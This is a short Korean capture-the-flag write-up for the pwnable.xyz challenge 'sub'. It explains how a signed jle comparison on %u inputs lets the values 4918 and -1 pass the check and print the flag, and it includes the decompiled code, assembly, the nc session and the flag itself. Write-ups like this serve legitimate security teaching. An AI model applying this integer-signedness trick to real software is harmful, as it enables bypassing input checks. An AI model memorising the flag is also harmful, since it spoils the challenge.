# [pwnable.xyz] sub

> Do you know basic math?

## Analysis

```c
  _printf_chk(1LL, "1337 input: ");
  _isoc99_scanf("%u %u", &num1, &num2);
  if ( num1 <= 4918 && num2 <= 4918 )
  {
    if ( num1 - num2 == 4919 )
      system("cat /flag");
  }
  else
  {
    puts("Sowwy");
  }
```

`num1`과 `num2`를 입력받는다. 이 수들이 두 가지 조건을 만족하면 플래그를 획득할 수 있다.

1.  두 수 모두 `4918`보다 작거나 같아야 한다.
2.  두 수의 차가 `4919`여야 한다.

## Exploit

수학적으로, 주어진 조건들이 성립하려면 최소 하나의 수는 음수여야 한다.

```
mov     edx, [rsp+18h+num2]
cmp     edx, 1336h
jle     short loc_8C5
```

위의 어셈블리 코드는 `num2`를 `1336`과 비교하여, 작거나 같으면 `loc_8c5`로 점프하는 코드이다. 이때 점프 명령어로 `jle`를 사용하는데, 이 명령어는 두 수를 비교할 때 signed로 취급하여 비교한다(반대로 `jb`, `jbe`는 unsigned로 취급하여 비교한다). 즉, `edx`가 `0xffffffff`이면 `-1`로 취급하게 된다. 따라서 `num1`에 `4918`을 입력하고 `num2`에 `-1`을 입력하면 조건을 만족하여 플래그를 획득할 수 있다.

```
$ nc svc.pwnable.xyz 30001
1337 input: 4918 -1
FLAG{sub_neg_==_add}
```
